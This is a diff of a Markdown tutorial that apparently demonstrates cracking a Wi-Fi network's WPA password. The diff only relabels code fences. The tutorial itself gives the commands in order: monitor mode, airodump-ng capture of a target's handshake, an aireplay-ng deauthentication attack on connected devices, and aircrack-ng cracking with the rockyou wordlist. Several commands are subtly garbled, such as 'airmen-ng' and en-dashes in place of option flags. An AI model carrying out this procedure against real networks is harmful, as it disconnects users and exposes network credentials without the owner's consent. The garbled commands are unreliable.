@@ -27,7 +27,7 @@ The network adapter I am using for this attack demo is **Alpha’s AWUS036H**.
 
 After connecting the network adapter, open the Kali Linux machine and write the followingcommand on the terminal.
 
-```code
+```bash
 iwconfig
 ```
 
@@ -35,7 +35,7 @@ iwconfig
 
 When we connect the adapter, you’ll see the wlan0 interface on your terminal screens. To change the mode to `Monitor Mode`, use the following command.
 
-```code
+```bash
 sudo airmen-ng start wlan0 
 ```
 
@@ -43,7 +43,7 @@ sudo airmen-ng start wlan0
 
 Again, use the command mentioned below to verify the monitor mode.
 
-```code
+```bash
 iwconfig
 ```
 
@@ -51,7 +51,7 @@ iwconfig
 
 As you can see, the mode has been changed. Now, use the airodump-ng tool to capture wireless network traffic on the specified interface.
 
-```code
+```bash
 sudo airodump-ng wlan0
 ```
 
@@ -61,7 +61,7 @@ It will display information about nearby **WiFi Networks**. Our intended interfa
 
 The Following command tells us how many devices are connected tothis Network interface.
 
-```code
+```bash
 sudo airodump-ng wlan0 -d <mac-address>
 ```
 
@@ -69,7 +69,7 @@ sudo airodump-ng wlan0 -d <mac-address>
 
 Remember, WiFi Networks always occupy a limited radius of the area. So, you should be within that radius to discover the WiFi network. The next step is to capture the handshake, using the **death attack**.
 
-```code
+```bash
 sudo airodump-ng -w <filename> –c 1 --bssid <target-mac> wlan0
 ```
 
@@ -77,7 +77,7 @@ sudo airodump-ng -w <filename> –c 1 --bssid <target-mac> wlan0
 
 In this attack, we save the handshake in a `.pcap` file. The next step is the death attack: We open another terminal and type the following command.
 
-```code
+```bash
 sudo aireplay-ng -–deauth 0 -a <target-mac> wlan0
 ```
 
@@ -96,7 +96,7 @@ Now, you see that it captures the handshake. Type in the ls command to see the f
 
 In our attack method, we are going to crack the password in our test-01.cap in encrypted form. The cracking is totally offline; we don’t need an internet connection or Wi-Fi adapter for it. We’ll use their crack toolto crack the password.
 
-```code
+```bash
 aircrack-ng <filename.cap> -w /usr/share/wordlists/rockyou.txt
 ```
 
